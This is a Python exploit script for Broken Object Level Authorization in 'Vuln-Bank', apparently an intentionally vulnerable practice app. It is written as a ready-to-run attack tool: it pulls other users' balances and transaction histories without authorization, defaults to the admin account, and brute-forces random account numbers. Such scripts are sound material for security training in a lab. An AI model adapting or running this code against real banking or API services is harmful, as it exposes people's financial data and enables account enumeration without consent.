#!/usr/bin/env python3
"""
BOLA (Broken Object Level Authorization) Exploit for Vuln-Bank

This script demonstrates the BOLA vulnerability in the Vuln-Bank application
by accessing account balances and transaction histories of other users without
proper authorization.

Usage:
    python3 exploit.py [target_url]

Example:
    python3 exploit.py http://localhost:5000
"""

import requests
import json
import sys
import argparse
import random

def exploit_check_balance(base_url, account_number):
    """
    Exploits BOLA vulnerability in the check_balance endpoint
    
    Args:
        base_url: The base URL of the vulnerable application
        account_number: The account number to check (can be any user's account)
        
    Returns:
        dict: The JSON response containing the account balance and user info
    """
    print(f"[*] Attempting to access balance for account: {account_number}")
    
    # Send the request to the check_balance endpoint
    balance_url = f"{base_url}/check_balance/{account_number}"
    
    try:
        response = requests.get(balance_url)
        
        if response.status_code == 200:
            data = response.json()
            print("[+] BOLA exploitation successful!")
            print(f"[+] Username: {data.get('username', 'Unknown')}")
            print(f"[+] Account Number: {data.get('account_number', 'Unknown')}")
            print(f"[+] Balance: ${data.get('balance', 'Unknown')}")
            return data
        else:
            print(f"[-] Failed to exploit BOLA. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return None
    except Exception as e:
        print(f"[-] Error during exploitation: {str(e)}")
        return None

def exploit_transaction_history(base_url, account_number):
    """
    Exploits BOLA vulnerability in the transaction history endpoint
    
    Args:
        base_url: The base URL of the vulnerable application
        account_number: The account number to check (can be any user's account)
        
    Returns:
        dict: The JSON response containing the transaction history
    """
    print(f"[*] Attempting to access transaction history for account: {account_number}")
    
    # Send the request to the transactions endpoint
    transactions_url = f"{base_url}/transactions/{account_number}"
    
    try:
        response = requests.get(transactions_url)
        
        if response.status_code == 200:
            data = response.json()
            print("[+] BOLA exploitation successful!")
            print(f"[+] Account Number: {data.get('account_number', 'Unknown')}")
            print(f"[+] Number of transactions: {len(data.get('transactions', []))}")
            
            # Print a sample of transactions if available
            transactions = data.get('transactions', [])
            if transactions:
                print("\n[+] Sample transactions:")
                for i, tx in enumerate(transactions[:3]):  # Show first 3 transactions
                    print(f"    Transaction {i+1}:")
                    print(f"    - From: {tx.get('from_account', 'Unknown')}")
                    print(f"    - To: {tx.get('to_account', 'Unknown')}")
                    print(f"    - Amount: ${tx.get('amount', 'Unknown')}")
                    print(f"    - Type: {tx.get('type', 'Unknown')}")
                    print(f"    - Date: {tx.get('timestamp', 'Unknown')}")
                    print()
            
            return data
        else:
            print(f"[-] Failed to exploit BOLA. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return None
    except Exception as e:
        print(f"[-] Error during exploitation: {str(e)}")
        return None

def enumerate_accounts(base_url, start=1000000000, end=9999999999, limit=10):
    """
    Attempts to enumerate valid account numbers by brute force
    
    Args:
        base_url: The base URL of the vulnerable application
        start: Starting account number to try
        end: Ending account number to try
        limit: Maximum number of accounts to find
        
    Returns:
        list: List of valid account numbers found
    """
    print("[*] Attempting to enumerate valid account numbers...")
    
    valid_accounts = []
    attempts = 0
    max_attempts = 100  # Limit the number of attempts to avoid excessive requests
    
    # Try known account number first
    known_account = "ADMIN001"
    if exploit_check_balance(base_url, known_account):
        valid_accounts.append(known_account)
        print(f"[+] Found valid account: {known_account}")
    
    # Try random account numbers
    while len(valid_accounts) < limit and attempts < max_attempts:
        account_number = str(random.randint(start, end))
        attempts += 1
        
        print(f"[*] Trying account number: {account_number} (Attempt {attempts}/{max_attempts})")
        result = exploit_check_balance(base_url, account_number)
        
        if result:
            valid_accounts.append(account_number)
            print(f"[+] Found valid account: {account_number}")
            
            # If we've found enough accounts, stop
            if len(valid_accounts) >= limit:
                break
    
    return valid_accounts

def main():
    parser = argparse.ArgumentParser(description="Exploit BOLA vulnerabilities in Vuln-Bank")
    parser.add_argument("url", nargs="?", default="http://localhost:5000", 
                        help="Base URL of the vulnerable application (default: http://localhost:5000)")
    parser.add_argument("--account", help="Specific account number to target")
    parser.add_argument("--enumerate", action="store_true", help="Attempt to enumerate valid account numbers")
    parser.add_argument("--transactions", action="store_true", help="Access transaction history")
    args = parser.parse_args()
    
    print("=== Vuln-Bank BOLA Exploit ===")
    print(f"[*] Target: {args.url}")
    
    if args.enumerate:
        valid_accounts = enumerate_accounts(args.url)
        print(f"\n[+] Found {len(valid_accounts)} valid accounts:")
        for account in valid_accounts:
            print(f"    - {account}")
    elif args.account:
        # Check balance for the specified account
        balance_result = exploit_check_balance(args.url, args.account)
        
        # If requested, also check transaction history
        if args.transactions and balance_result:
            print("\n[*] Accessing transaction history...")
            exploit_transaction_history(args.url, args.account)
    else:
        # Default to checking the admin account
        admin_account = "ADMIN001"
        print(f"[*] No account specified, using default admin account: {admin_account}")
        
        balance_result = exploit_check_balance(args.url, admin_account)
        
        if balance_result and args.transactions:
            print("\n[*] Accessing transaction history...")
            exploit_transaction_history(args.url, admin_account)

if __name__ == "__main__":
    main()
